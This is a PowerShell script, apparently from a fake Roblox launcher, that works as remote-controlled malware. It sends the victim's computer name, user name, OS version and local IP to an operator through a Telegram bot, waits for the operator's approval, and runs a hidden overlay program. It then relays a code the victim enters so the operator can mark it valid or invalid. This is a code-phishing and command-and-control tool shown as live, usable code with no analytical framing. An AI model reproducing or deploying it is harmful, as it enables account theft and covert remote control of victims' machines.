[Net.ServicePointManager]::SecurityProtocol = 3072
$d = "$env:APPDATA\RbxLaunch"

$ini = @{}
Get-Content "$d\config.ini" | ForEach-Object {
    if ($_ -match '^([^=]+)=(.+)$') { $ini[$Matches[1].Trim()] = $Matches[2].Trim() }
}
$tok = $ini['token']
$cid = $ini['chat_id']
$oid = $ini['owner_id']

function Tg($ep, $json) {
    try {
        $bytes = [Text.Encoding]::UTF8.GetBytes($json)
        $req = [Net.WebRequest]::Create("https://api.telegram.org/bot$tok/$ep")
        $req.Method = 'POST'; $req.ContentType = 'application/json'; $req.ContentLength = $bytes.Length
        $s = $req.GetRequestStream(); $s.Write($bytes, 0, $bytes.Length); $s.Close()
        (New-Object IO.StreamReader $req.GetResponse().GetResponseStream()).ReadToEnd() | ConvertFrom-Json
    } catch {}
}

function Poll($offset) {
    try {
        $url = "https://api.telegram.org/bot$tok/getUpdates?offset=$offset&timeout=30&allowed_updates=%5B%22callback_query%22%5D"
        (New-Object Net.WebClient).DownloadString($url) | ConvertFrom-Json
    } catch { $null }
}

function CheckSubmitted {
    try {
        $r = [Net.WebRequest]::Create('http://127.0.0.1:7823/submitted')
        $r.Timeout = 1000
        $resp = $r.GetResponse()
        $code = [int]$resp.StatusCode
        $resp.Close()
        return $code -eq 200
    } catch { return $false }
}

# Flush stale updates
try {
    $res = ((New-Object Net.WebClient).DownloadString("https://api.telegram.org/bot$tok/getUpdates?offset=-1&timeout=0") | ConvertFrom-Json).result
    $offset = if ($res) { $res[-1].update_id + 1 } else { 0 }
} catch { $offset = 0 }

# PC info
$localip = try {
    $u = New-Object Net.Sockets.UdpClient; $u.Connect('8.8.8.8', 80)
    $ip = $u.Client.LocalEndPoint.Address; $u.Close(); $ip
} catch { 'unavailable' }
$info = "Host: $env:COMPUTERNAME`nUser: $env:USERNAME`nOS: $([Environment]::OSVersion.Version)`nIP: $localip"

# Approval gate
Tg 'sendMessage' "{`"chat_id`":`"$oid`",`"text`":`"⚠️ Execution requested — approve?\n\n$info`",`"reply_markup`":{`"inline_keyboard`":[[{`"text`":`"✅ Approve`",`"callback_data`":`"approve`"},{`"text`":`"❌ Deny`",`"callback_data`":`"deny`"}]]}}"

$approved = $null
while ($null -eq $approved) {
    $data = Poll $offset
    if ($data -and $data.result) {
        foreach ($upd in $data.result) {
            $offset = $upd.update_id + 1
            $cb = $upd.callback_query
            if (!$cb) { continue }
            if ($cb.data -eq 'approve') { Tg 'answerCallbackQuery' "{`"callback_query_id`":`"$($cb.id)`",`"text`":`"✅ Approved`"}"; $approved = $true; break }
            if ($cb.data -eq 'deny')    { Tg 'answerCallbackQuery' "{`"callback_query_id`":`"$($cb.id)`",`"text`":`"❌ Denied`"}";   $approved = $false; break }
        }
    }
}
if (-not $approved) { exit }

# Theme picker
Tg 'sendMessage' "{`"chat_id`":`"$cid`",`"text`":`"🎨 Choose overlay theme:`",`"reply_markup`":{`"inline_keyboard`":[[{`"text`":`"☀️ Light`",`"callback_data`":`"theme_light`"},{`"text`":`"🌙 Dark`",`"callback_data`":`"theme_dark`"}]]}}"

$theme = $null
while ($null -eq $theme) {
    $data = Poll $offset
    if ($data -and $data.result) {
        foreach ($upd in $data.result) {
            $offset = $upd.update_id + 1
            $cb = $upd.callback_query
            if ($cb -and $cb.data -like 'theme_*') {
                $theme = $cb.data -replace 'theme_', ''
                Tg 'answerCallbackQuery' "{`"callback_query_id`":`"$($cb.id)`",`"text`":`"Launching $theme overlay...`"}"
                break
            }
        }
    }
}

$overlayExe = "$d\overlay\overlay.exe"
Start-Process $overlayExe -ArgumentList $theme -WindowStyle Hidden
Start-Sleep 3
Tg 'sendMessage' "{`"chat_id`":`"$cid`",`"text`":`"🟢 Overlay opened — waiting for code...`"}"

$waitingForOutcome = $false
while ($true) {
    if (-not $waitingForOutcome -and (CheckSubmitted)) {
        $waitingForOutcome = $true
        Tg 'sendMessage' "{`"chat_id`":`"$cid`",`"text`":`"🔔 Code submitted\n\nChoose outcome:`",`"reply_markup`":{`"inline_keyboard`":[[{`"text`":`"✅ Valid`",`"callback_data`":`"valid`"},{`"text`":`"❌ Invalid`",`"callback_data`":`"invalid`"}]]}}"
    }
    $data = Poll $offset
    if ($data -and $data.result) {
        foreach ($upd in $data.result) {
            $offset = $upd.update_id + 1
            $cb = $upd.callback_query
            if (!$cb) { continue }
            if ($cb.data -eq 'valid') {
                Tg 'answerCallbackQuery' "{`"callback_query_id`":`"$($cb.id)`",`"text`":`"✅ Overlay closed`"}"
                try { (New-Object Net.WebClient).DownloadString('http://127.0.0.1:7823/valid') } catch {}
                $waitingForOutcome = $false
            }
            if ($cb.data -eq 'invalid') {
                Tg 'answerCallbackQuery' "{`"callback_query_id`":`"$($cb.id)`",`"text`":`"❌ Error shown`"}"
                try { (New-Object Net.WebClient).DownloadString('http://127.0.0.1:7823/invalid') } catch {}
                $waitingForOutcome = $false
            }
        }
    }
    Start-Sleep 1
}
